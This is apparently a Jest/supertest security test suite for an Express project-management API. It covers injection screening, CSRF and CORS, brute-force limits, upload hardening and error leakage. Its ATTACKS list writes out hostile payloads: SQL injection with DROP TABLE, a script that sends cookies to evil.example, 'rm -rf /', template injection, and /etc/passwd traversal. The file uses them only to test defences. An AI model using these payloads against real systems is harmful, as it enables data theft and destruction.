import express from 'express';
import request from 'supertest';
import { signIn, anonymous, app, USERS, IDS, ZIP_BYTES, DEMO_PASSWORD } from './helpers.js';
import { resetMockStore } from '../src/config/mockSupabase.js';
import { authLimiter } from '../src/middleware/rateLimit.js';
import { inputGuard } from '../src/middleware/inputGuard.js';

const ATTACKS = {
  'SQL injection (tautology)': "' OR '1'='1' --",
  'SQL injection (stacked)': "'; DROP TABLE profiles; --",
  'SQL injection (union)': "x' UNION SELECT password_hash FROM profiles --",
  'stored XSS (script)': '<script>fetch("//evil.example?c="+document.cookie)</script>',
  'XSS (event handler)': '<img src=x onerror=alert(1)>',
  'XSS (javascript: URL)': 'javascript:alert(1)',
  'command injection': 'a; rm -rf /',
  'template injection': '{{constructor.constructor("return process")()}}',
  'path traversal': '../../../../etc/passwd',
  'NoSQL operator string': '{"$gt": ""}',
};

describe('Injection screening on every writable text input (rejected BEFORE saving)', () => {
  let manager;
  let client;
  let carol;
  let reviewer;

  beforeAll(async () => {
    resetMockStore();
    [manager, client, carol, reviewer] = await Promise.all([
      signIn(USERS.manager), signIn(USERS.client), signIn(USERS.carol), signIn(USERS.reviewer),
    ]);
  });

  const validRequest = { title: 'Valid title', description: 'A perfectly valid description.', priority: 'low', requested_deadline: '2027-06-01' };
  const validTask = { project_id: IDS.project1, title: 'Valid task', priority: 'low', start_date: '2027-06-01', due_date: '2027-06-05' };

  describe.each(Object.entries(ATTACKS))('%s', (_label, payload) => {
    test('project request title/description/requirements', async () => {
      for (const field of ['title', 'description', 'requirements']) {
        const res = await client.post('/api/project-requests').send({ ...validRequest, [field]: payload });
        expect(res.status).toBe(400);
        expect(res.body.error).toMatch(/rejected|Validation/i);
      }
    });

    test('project request PATCH', async () => {
      const res = await client.patch(`/api/project-requests/${IDS.req2}`).send({ description: payload });
      expect(res.status).toBe(400);
    });

    test('project create / update', async () => {
      expect((await manager.post('/api/projects').send({ title: payload, client_id: 'client-001' })).status).toBe(400);
      expect((await manager.post('/api/projects').send({ title: 'Ok title', description: payload, client_id: 'client-001' })).status).toBe(400);
      expect((await manager.patch(`/api/projects/${IDS.project1}`).send({ title: payload })).status).toBe(400);
    });

    test('task create / update', async () => {
      expect((await manager.post('/api/tasks').send({ ...validTask, title: payload })).status).toBe(400);
      expect((await manager.post('/api/tasks').send({ ...validTask, description: payload })).status).toBe(400);
      expect((await manager.patch(`/api/tasks/${IDS.taskTodo}`).send({ description: payload })).status).toBe(400);
      expect((await carol.patch(`/api/tasks/${IDS.taskInProgress}`).send({ description: payload })).status).toBe(400);
    });

    test('review feedback and submission notes', async () => {
      const res = await reviewer
        .post('/api/submissions/44444444-0000-0000-0000-000000000001/reviews')
        .send({ decision: 'revision', feedback: payload });
      expect(res.status).toBe(400);
      const sub = await carol
        .post(`/api/tasks/${IDS.taskInProgress}/submissions`)
        .field('description', payload)
        .attach('file', ZIP_BYTES, 'ok.zip');
      expect(sub.status).toBe(400);
    });

    test('login, register and staff creation fields', async () => {
      expect((await anonymous().post('/api/auth/login').send({ email: payload, password: DEMO_PASSWORD })).status).toBe(400);
      expect((await anonymous().post('/api/auth/register').send({ email: 'ok@example.com', display_name: payload, password: 'Str0ng!Passphrase' })).status).toBe(400);
      expect((await manager.post('/api/users').send({ email: 'ok2@example.com', display_name: payload, role: 'assignee', password: 'Str0ng!Passphrase' })).status).toBe(400);
    });

    test('query-string and path parameters', async () => {
      const enc = encodeURIComponent(payload);
      expect((await manager.get(`/api/tasks?status=${enc}`)).status).toBe(400);
      expect((await manager.get(`/api/projects?client_id=${enc}`)).status).toBe(400);
      expect((await manager.get(`/api/tasks/${enc}`)).status).toBe(400);
    });
  });

  test('NOTHING hostile was persisted by any of the attempts above', async () => {
    const [reqs, projects, tasks] = await Promise.all([
      manager.get('/api/project-requests?limit=100'),
      manager.get('/api/projects?limit=100'),
      manager.get('/api/tasks?limit=100'),
    ]);
    const blob = JSON.stringify([reqs.body, projects.body, tasks.body]);
    expect(blob).not.toMatch(/DROP TABLE|<script|onerror|UNION SELECT|etc\/passwd|rm -rf/i);
  });

  test('error responses never echo the hostile payload (no reflected XSS)', async () => {
    const res = await client.post('/api/project-requests').send({ ...validRequest, title: '<script>alert(1)</script>' });
    expect(res.status).toBe(400);
    expect(JSON.stringify(res.body)).not.toContain('<script>');
  });

  test('type confusion: objects / arrays / numbers where text is expected are rejected', async () => {
    for (const bad of [{ a: 1 }, ['x'], 12345, true]) {
      const res = await client.post('/api/project-requests').send({ ...validRequest, title: bad });
      expect(res.status).toBe(400);
    }
  });

  test('mass assignment: unknown / privileged fields are stripped, never stored', async () => {
    const res = await client.post('/api/project-requests').send({ ...validRequest, status: 'approved', client_id: 'manager-001', id: 'hijack', role: 'project_manager' });
    expect(res.status).toBe(201);
    expect(res.body.data.status).toBe('pending');
    expect(res.body.data.client_id).toBe('client-001');
    expect(res.body.data.id).not.toBe('hijack');
    expect(res.body.data.role).toBeUndefined();
  });

  test('prototype-pollution payload is rejected and does not pollute Object', async () => {
    const res = await client
      .post('/api/project-requests')
      .set('Content-Type', 'application/json')
      .send('{"title":"Valid title","__proto__":{"polluted":true}}');
    expect(res.status).toBe(400);
    expect({}.polluted).toBeUndefined();
  });

  test('malformed JSON gives a clean 400 without a stack trace', async () => {
    const res = await client.post('/api/project-requests').set('Content-Type', 'application/json').send('{"title": ');
    expect(res.status).toBe(400);
    expect(res.body.error).toBe('Malformed JSON body');
    expect(JSON.stringify(res.body)).not.toMatch(/at .*\.js|node_modules/);
  });

  test('oversized JSON body (> 100 kB) is refused with 413', async () => {
    const res = await client.post('/api/project-requests').send({ ...validRequest, description: 'x'.repeat(150_000) });
    expect(res.status).toBe(413);
  });
});

describe('CSRF & cross-origin protection', () => {
  let manager;
  beforeAll(async () => {
    resetMockStore();
    manager = await signIn(USERS.manager);
  });

  const body = { title: 'CSRF probe project', client_id: 'client-001' };

  test('state-changing request with a valid session cookie but NO csrf token is blocked', async () => {
    const res = await manager.agent.post('/api/projects').send(body);
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('BAD_CSRF');
  });

  test('wrong csrf token is blocked', async () => {
    const res = await manager.agent.post('/api/projects').set('X-CSRF-Token', 'not-the-token').send(body);
    expect(res.status).toBe(403);
  });

  test('csrf token from ANOTHER user\'s session is blocked', async () => {
    const other = await signIn(USERS.carol);
    const res = await manager.agent.post('/api/projects').set('X-CSRF-Token', other.csrf).send(body);
    expect(res.status).toBe(403);
  });

  test('correct token passes', async () => {
    const res = await manager.post('/api/projects').send(body);
    expect(res.status).toBe(201);
  });

  test('requests from a foreign Origin are blocked even with a token', async () => {
    const res = await manager.post('/api/projects').set('Origin', 'https://evil.example').send(body);
    expect(res.status).toBe(403);
    expect(res.body.code).toBe('BAD_ORIGIN');
  });

  test('login from a foreign Origin is blocked (login CSRF)', async () => {
    const res = await anonymous().post('/api/auth/login').set('Origin', 'https://evil.example').send({ email: USERS.manager, password: DEMO_PASSWORD });
    expect(res.status).toBe(403);
  });

  test('GET requests are not subject to CSRF tokens', async () => {
    expect((await manager.get('/api/projects')).status).toBe(200);
  });

  test('CORS: allowed origin gets credentialed headers, foreign origin gets none', async () => {
    const ok = await anonymous().get('/api/health').set('Origin', 'http://localhost:5173');
    expect(ok.headers['access-control-allow-origin']).toBe('http://localhost:5173');
    expect(ok.headers['access-control-allow-credentials']).toBe('true');
    const bad = await anonymous().get('/api/health').set('Origin', 'https://evil.example');
    expect(bad.headers['access-control-allow-origin']).toBeUndefined();
  });

  test('CORS pre-flight does not allow dev identity headers any more', async () => {
    const res = await anonymous().options('/api/tasks').set('Origin', 'http://localhost:5173').set('Access-Control-Request-Method', 'POST');
    expect(res.headers['access-control-allow-headers'] || '').not.toMatch(/X-Dev/i);
  });
});

describe('Brute-force protection', () => {
  test('auth limiter returns 429 after the configured number of attempts', async () => {
    const mini = express();
    mini.use(express.json());
    mini.post('/login', authLimiter({ max: 3, windowMs: 60_000 }), (req, res) => res.json({ ok: true }));
    for (let i = 0; i < 3; i++) expect((await request(mini).post('/login').send({})).status).toBe(200);
    const blocked = await request(mini).post('/login').send({});
    expect(blocked.status).toBe(429);
    expect(blocked.body.error).toMatch(/Too many/);
  });

  test('inputGuard as standalone middleware rejects hostile body with 400', async () => {
    const mini = express();
    mini.use(express.json());
    mini.use(inputGuard);
    mini.post('/x', (req, res) => res.json({ saved: req.body }));
    expect((await request(mini).post('/x').send({ a: 'hello' })).status).toBe(200);
    expect((await request(mini).post('/x').send({ a: '<script>1</script>' })).status).toBe(400);
  });
});

describe('Upload hardening (end to end)', () => {
  let carol;
  beforeAll(async () => {
    resetMockStore();
    carol = await signIn(USERS.carol);
  });

  const upload = (name, buf) => carol.post(`/api/tasks/${IDS.taskInProgress}/submissions`).attach('file', buf, name);

  test.each([
    ['payload.exe', Buffer.from('MZ binary')],
    ['shell.sh', Buffer.from('#!/bin/sh')],
    ['page.html', Buffer.from('<html></html>')],
    ['spoof.pdf', Buffer.from('this is not a pdf')],
    ['exec.zip', Buffer.from('MZ\x90\x00 pretending to be zip')],
    ['evil.php.zip', ZIP_BYTES],
    ['empty.zip', Buffer.alloc(0)],
  ])('%s is rejected with 400', async (name, buf) => {
    const res = await upload(name, buf);
    expect(res.status).toBe(400);
    expect(res.body.success).toBe(false);
  });

  test('upload without a file is rejected', async () => {
    const res = await carol.post(`/api/tasks/${IDS.taskInProgress}/submissions`).field('description', 'no file');
    expect(res.status).toBe(400);
  });

  test('path-traversal file name is neutralised, valid ZIP accepted', async () => {
    const res = await upload('../../../evil name.zip', ZIP_BYTES);
    expect(res.status).toBe(201);
    expect(res.body.data.file_name).toBe('evil name.zip');
  });

  test('oversize upload (> 25 MB) is rejected', async () => {
    const big = Buffer.concat([ZIP_BYTES, Buffer.alloc(26 * 1024 * 1024)]);
    const fresh = await signIn(USERS.carol);
    const res = await fresh.post(`/api/tasks/${IDS.taskDesign}/submissions`).attach('file', big, 'big.zip');
    expect([400, 413]).toContain(res.status);
  });
});

describe('Error handling & information leakage', () => {
  test('unknown route returns generic 404 JSON', async () => {
    const m = await signIn(USERS.manager);
    const res = await m.get('/api/does-not-exist');
    expect(res.status).toBe(404);
    expect(res.body.error).toBe('Route not found');
  });

  test('responses include a request id for traceability', async () => {
    const res = await app && (await anonymous().get('/api/health'));
    expect(res.headers['x-request-id']).toMatch(/^[0-9a-f-]{36}$/);
  });
});
